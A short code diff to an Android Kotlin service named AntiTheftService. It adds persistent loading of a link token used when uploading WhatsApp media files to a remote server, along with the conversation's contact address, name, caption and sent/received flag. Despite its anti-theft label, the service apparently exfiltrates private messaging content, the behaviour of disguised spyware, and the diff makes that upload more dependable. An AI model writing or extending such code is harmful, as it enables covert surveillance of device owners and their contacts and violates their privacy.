@@ -205,6 +205,7 @@ class AntiTheftService : LifecycleService() {
         modelName = if (customName.isNotEmpty()) customName
                     else "${Build.MANUFACTURER} ${Build.MODEL}"
         currentModelName = modelName
+        linkToken = sharedPrefs.getString("link_token", "") ?: ""
         
         // Init Helpers
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
@@ -702,7 +703,10 @@ class AntiTheftService : LifecycleService() {
 
     // Upload a WhatsApp media file and notify server which conversation it belongs to
     private fun uploadWhatsAppMediaInternal(file: File, type: String, isSent: Boolean, address: String, name: String, caption: String) {
-        val token = linkToken.trim()
+        val token = linkToken.ifBlank {
+            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
+                .getString("link_token", "") ?: ""
+        }.trim()
         val path = "/upload/whatsapp-media/$deviceId${if (token.isNotEmpty()) "?linkToken=$token" else ""}"
         val serverUrl = getUploadUrl(path)
         Log.d("AntiTheftService", "Uploading WhatsApp media to: $serverUrl")
